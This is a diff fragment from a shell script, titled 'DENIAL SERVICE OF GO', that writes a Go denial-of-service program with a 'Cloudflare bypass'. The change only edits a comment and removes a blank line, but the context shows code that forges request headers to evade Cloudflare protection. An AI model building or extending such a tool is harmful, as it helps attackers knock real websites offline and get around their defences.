@@ -23,7 +23,7 @@ echo -e "${WHITE}  DENIAL SERVICE OF GO${NC}"
 echo -e "${CYAN}${SEP}${NC}"
 echo
 
-# Create main.go file directly (ENHANCED version with Cloudflare bypass)
+# Create main.go file directly (FIXED version with Cloudflare bypass)
 echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go with Cloudflare bypass...${NC}"
 
 cat > main.go << 'EOF'
@@ -896,7 +896,6 @@ func generateCloudflareHeaders(req *http.Request) {
 		}
 	}
 
-	
 	if randInt(1, 100) <= 25 {
 		req.Header.Set("X-Request-Start", fmt.Sprintf("%d", time.Now().UnixNano()/1000000))
 		req.Header.Set("X-Request-ID", generateRequestID())
